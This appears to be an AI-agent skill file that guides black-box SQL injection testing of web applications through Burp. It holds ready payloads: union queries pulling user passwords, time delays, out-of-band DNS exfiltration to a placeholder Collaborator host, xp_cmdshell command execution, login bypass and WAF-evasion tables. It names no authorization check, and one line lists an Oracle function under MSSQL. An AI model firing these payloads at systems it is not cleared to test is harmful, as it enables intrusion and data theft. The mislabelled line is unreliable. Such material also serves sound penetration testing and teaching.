---
name: sqli-detect
description: Finding SQL injection vulnerabilities in web applications.
---

# Overview
This skill focuses on identifying potential SQL injection vulnerabilities in web applications by analyzing the application's behavior and responses to pre-generated input data - Black box pentesting. The goal is to detect whether an application is vulnerable to SQL injection without affecting the application itself (no DoS, no database dump).

### Prerequisites & Tools Coordination

- **Burp MCP**: Used to analyze Request/Response packets, raw HTTP headers from browsing history, or intercept data.

# Mindset

- RULE: `Injection` is insert and extend.
- All input parameters and values that are sent to the server should be considered as potential attack vectors for SQL injection.
- Identyfication type of DBMS (e.g., MySQL, PostgreSQL, Oracle, SQL Server) and type of SQL query (e.g., SELECT, INSERT, UPDATE, DELETE) is crucial for understanding the potential impact of the vulnerability and for crafting effective payloads.
- Analyzing unusual response, error messages, or behavior of the application can provide valuable insights into the presence of SQL injection vulnerabilities.
- Prioritize checking SQLi vulnerabilities at locations related to table names, column names, or the `order_by` clause, as these locations cannot use `prepare statements`. However, other locations cannot be ruled out.

# Approach 

- Identify all input Parameters and Values that are sent to the server, including URL parameters, form data, cookies, and HTTP headers.

- Context analysis: view responses data and behavior of the application to identify how the application processes the input data and to identify potential vulnerabilities.

- Imagine query structure and database schema based on the application's functionality and behavior to craft effective payloads for testing.

# Methodology

Following the OWASP Testing Guide for SQL Injection (https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Testing_for_SQL_Injection) and allways flow this steps to ensure a systematic and thorough approach to SQL injection testing.

## Step 1: Identify Potential Injection Points

- Analyze the application's Input fields, URL parameters, form data (key and value), cookies, and HTTP headers to identify potential injection

- Injecting special characters (e.g., single quotes, double quotes, semicolons, star, ...) into input fields to test for SQL injection vulnerabilities. if application return SQL error messages, or 500 Internal Server Error, or response data contains unexpected data or visual changes in the application, it may indicate a potential SQL injection vulnerability.

- If have WAF, try to bypass it using common techniques (e.g., encoding payloads, using different case for SQL keywords, using comments to obfuscate payloads) and analyze the application's response to identify potential vulnerabilities.


## Step 2: Identify the Type of SQL Injection

### In-band SQL Injection

- **Error-based SQL Injection**: Inputting special characters (e.g., a single quote ') into input fields might trigger SQL errors. If the application displays detailed error messages, it can indicate a potential SQL injection point.
  * Simple characters: `'`, `"`, `;`, `)` and `*`
    * Simple characters encoded: `%27`, `%22`, `%23`, `%3B`, `%29` and `%2A`
    * Multiple encoding: `%%2727`, `%25%27`
    * Unicode characters: `U+02BA`, `U+02B9`
        * MODIFIER LETTER DOUBLE PRIME (`U+02BA` encoded as `%CA%BA`) is transformed into `U+0022` QUOTATION MARK (`)
        * MODIFIER LETTER PRIME (`U+02B9` encoded as `%CA%B9`) is transformed into `U+0027` APOSTROPHE (')
  - Example
  ```
  http://example.com/product?id=1 -> return product details
  http://example.com/product?id=1' -> return SQL error message with database information
  ```
- **Union-based SQL Injection**: Uses the UNION operator to combine the results of two or more SELECT statements. 
  - Example
  ```
  http://example.com/product?id=1 -> return product details
  http://example.com/product?id=1 UNION SELECT username, password FROM users -> return usernames and passwords from the users table in the response data
  ```

### Inferential SQL Injection

- **Boolean-based Blind SQL Injection**: Using boolean conditions in the payload to determine whether the application is vulnerable to SQL injection based on the application's response. For example, entering `user=admin` and `user=ad'+'min` both return the information of the same person.
  * Merging characters
      ```sql
      `+HERP
      '||'DERP
      '+'herp
      ' 'DERP
      '%20'HERP
      '%2B'HERP
      ```
  - Example
  ```
  http://example.com/product?id=1 -> return product details
  http://example.com/product?id=1 AND 1=1 -> return product details (vulnerable)
  http://example.com/product?id=1 AND 1=2 -> return no product details (vulnerable)
  ```

- **Time-based Blind SQL Injection**: Inputting SQL commands that cause deliberate delays (e.g., using `SLEEP` or `BENCHMARK` functions in MySQL) can help identify potential injection points. If the application takes an unusually long time to respond after such input, it might be vulnerable.
  * Default `SLEEP` function for the database
  ```sql
  ' AND SLEEP(5)/*
  ' AND '1'='1' AND SLEEP(5)
  ' ; WAITFOR DELAY '00:00:05' --
  ```
  * Heavy queries that take a lot of time to complete, usually crypto functions.
  ```sql
  BENCHMARK(2000000,MD5(NOW()))
  ```
  - Example
  ```
  http://example.com/product?id=1 -> return product details
  http://example.com/product?id=1 AND SLEEP(5) -> return product details after a delay of 5 seconds (vulnerable)
  ```

### Out-of-band SQL Injection

- **Out-of-band SQL Injection**: Out-of-Band SQL Injection (OOB SQLi) occurs when an attacker uses alternative communication channels to exfiltrate data from a database. Unlike traditional SQL injection techniques that rely on immediate responses within the HTTP response, OOB SQL injection depends on the database server's ability to make network connections to an attacker-controlled server. This method is particularly useful when the injected SQL command's results cannot be seen directly or the server's responses are not stable or reliable.

Different databases offer various methods for creating out-of-band connections, the most common technique is the DNS exfiltration:

* MySQL

  ```sql
  LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
  SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
  ```

* MSSQL

  ```sql
  SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
  exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
  ```

## Step 3: Identify the Type of DBMS and SQL Query

- Each DBMS has its own syntax and behavior, so identifying the type of DBMS can help in crafting effective payloads for testing and exploitation.

- Analyzing the application's functionality and behavior can provide insights into the type of SQL queries being executed (e.g., SELECT, INSERT, UPDATE, DELETE) and the structure of the database (e.g., table names, column names).
  - Example
  ```http://example.com/product?id=1 -> return product details
  http://example.com/product?id=1' AND 1=1; SELECT @@version -- -> return database version information in the response
  ```
- Cheatsheets for each DBMS can be found in `./assets` directory, which can help in identifying the type of DBMS and crafting effective payloads for testing.
  - MySQL: `./assets/MySQL Injection.md`
  - PostgreSQL: `./assets/PostgreSQL Injection.md`
  - Oracle: `./assets/OracleSQL Injection.md`
  - MSSQL: `./assets/MSSQL Injection.md`
  - SQLite: `./assets/SQLite Injection.md`

## Step 4: Exploitation (without DoS or database dump only return DBMS version or table names)

- Crafting payloads to extract information about the database structure (e.g., table names, column names) or to perform actions on the database (e.g., inserting data, updating data) without causing a Denial of Service (DoS)  or dumping the entire database.
  - Example
  ```
  http://example.com/product?id=1 -> return product details 
  http://example.com/product?id=1' AND 1=1; SELECT table_name FROM information_schema.tables -- -> return table names in the response
  ```

# Examples of SQL Injection Vulnerabilities

## Authentication bypass

In a standard authentication mechanism, users provide a username and password. The application typically checks these credentials against a database. For example, a SQL query might look something like this:
```sql
SELECT * FROM users WHERE username = 'user_input' AND password = 'password_input';
```
If an attacker inputs the following:
- Username: `admin' --`
- Password: `anything`
The resulting SQL query would be:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything';
```
The `--` sequence comments out the rest of the SQL query, effectively bypassing the password check. If there is a user named 'admin' in the database, the attacker would gain access without needing to know the password.

Reference payloads for authentication bypass: `./assets/Auth_Bypass.txt`
  

## Second Order SQL Injection

Second Order SQL Injection is a subtype of SQL injection where the malicious SQL payload is primarily stored in the application's database and later executed by a different functionality of the same application.
Unlike first-order SQLi, the injection doesn't happen right away. It is **triggered in a separate step**, often in a different part of the application.

1. User submits input that is stored (e.g., during registration or profile update).

   ```text
   Username: attacker'--
   Email: attacker@example.com
   ```

2. That input is saved **without validation** but doesn't trigger a SQL injection.

   ```sql
   INSERT INTO users (username, email) VALUES ('attacker\'--', 'attacker@example.com');
   ```

3. Later, the application retrieves and uses the stored data in a SQL query.

   ```python
   query = "SELECT * FROM logs WHERE username = '" + user_from_db + "'"
   ```

4. If this query is built unsafely, the injection is triggered.

## Stacked Based Injection

Stacked Queries SQL Injection is a technique where multiple SQL statements are executed in a single query, separated by a delimiter such as a semicolon (`;`). This allows an attacker to execute additional malicious SQL commands following a legitimate query. Not all databases or application configurations support stacked queries.

```sql
1; EXEC xp_cmdshell('whoami') --
```

# Tips & Tricks

## Bypass WAF techniques

REFERENCE: https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF  

### No Space Allowed

Some web applications attempt to secure their SQL queries by blocking or stripping space characters to prevent simple SQL injection attacks. However, attackers can bypass these filters by using alternative whitespace characters, comments, or creative use of parentheses.

#### Alternative Whitespace Characters

Most databases interpret certain ASCII control characters and encoded spaces (such as tabs, newlines, etc.) as whitespace in SQL statements. By encoding these characters, attackers can often evade space-based filters.

| Example Payload               | Description                      |
|-------------------------------|----------------------------------|
| `?id=1%09and%091=1%09--`      | `%09` is tab (`\t`)              |
| `?id=1%0Aand%0A1=1%0A--`      | `%0A` is line feed (`\n`)        |
| `?id=1%0Band%0B1=1%0B--`      | `%0B` is vertical tab            |
| `?id=1%0Cand%0C1=1%0C--`      | `%0C` is form feed               |
| `?id=1%0Dand%0D1=1%0D--`      | `%0D` is carriage return (`\r`)  |
| `?id=1%A0and%A01=1%A0--`      | `%A0` is non-breaking space      |

**ASCII Whitespace Support by Database**:

| DBMS         | Supported Whitespace Characters (Hex)            |
|--------------|--------------------------------------------------|
| SQLite3      | 0A, 0D, 0C, 09, 20                               |
| MySQL 5      | 09, 0A, 0B, 0C, 0D, A0, 20                       |
| MySQL 3      | 01–1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0|
| PostgreSQL   | 0A, 0D, 0C, 09, 20                               |
| Oracle 11g   | 00, 0A, 0D, 0C, 09, 20                           |
| MSSQL        | 01–1F, 20                                        |

#### Bypassing with Comments and Parentheses

SQL allows comments and grouping, which can break up keywords and queries, thus defeating space filters:

| Bypass                                    | Technique            |
| ----------------------------------------- | -------------------- |
| `?id=1/*comment*/AND/**/1=1/**/--`        | Comment              |
| `?id=1/*!12345UNION*//*!12345SELECT*/1--` | Conditional comment  |
| `?id=(1)and(1)=(1)--`                     | Parenthesis          |

### No Comma Allowed

Bypass using `OFFSET`, `FROM` and `JOIN`.

| Forbidden           | Bypass |
| ------------------- | ------ |
| `LIMIT 0,1`         | `LIMIT 1 OFFSET 0` |
| `SUBSTR('SQL',1,1)` | `SUBSTR('SQL' FROM 1 FOR 1)` |
| `SELECT 1,2,3,4`    | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d` |

### No Equal Allowed

Bypass using LIKE/NOT IN/IN/BETWEEN

| Bypass    | SQL Example |
| --------- | ------------------------------------------ |
| `LIKE`    | `SUBSTRING(VERSION(),1,1)LIKE(5)`          |
| `NOT IN`  | `SUBSTRING(VERSION(),1,1)NOT IN(4,3)`      |
| `IN`      | `SUBSTRING(VERSION(),1,1)IN(4,3)`          |
| `BETWEEN` | `SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4` |

### Case Modification

Bypass using uppercase/lowercase.

| Bypass    | Technique  |
| --------- | ---------- |
| `AND`     | Uppercase  |
| `and`     | Lowercase  |
| `aNd`     | Mixed case |

Bypass using keywords case insensitive or an equivalent operator.

| Forbidden | Bypass                      |
| --------- | --------------------------- |
| `AND`     | `&&`                        |
| `OR`      | `\|\|`                      |
| `=`       | `LIKE`, `REGEXP`, `BETWEEN` |
| `>`       | `NOT BETWEEN 0 AND X`       |
| `WHERE`   | `HAVING`                    |


## False positives

- Not all error messages or unusual responses indicate a SQL injection vulnerability. Some applications may have custom error handling that can produce similar responses without being vulnerable.
- Some applications may have security measures in place that can block or filter out malicious input, which can lead to false positives if not properly accounted for during testing.
- It's important to verify potential vulnerabilities through multiple testing methods and to analyze the application's behavior in depth to confirm whether a SQL injection vulnerability is present.
- Generic errors unrelated to SQL parsing or constraints
- Static response sizes due to templating rather than predicate truth
- Artificial delays from network/CPU unrelated to injected function calls
- Parameterized queries with no string concatenation, verified by code review

## Pro tips

- Prioritize checking SQLi vulnerabilities at locations related to table names, column names, or the `order_by` clause, as these locations cannot use `prepare statements`. However, other locations cannot be ruled out.

- The payload for the DBMS is always created based on the files inside the `assets` directory, not automatically generated.


# References
- OWASP Testing Guide for SQL Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Testing_for_SQL_Injection
- SQL Injection Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Cheat_Sheet.html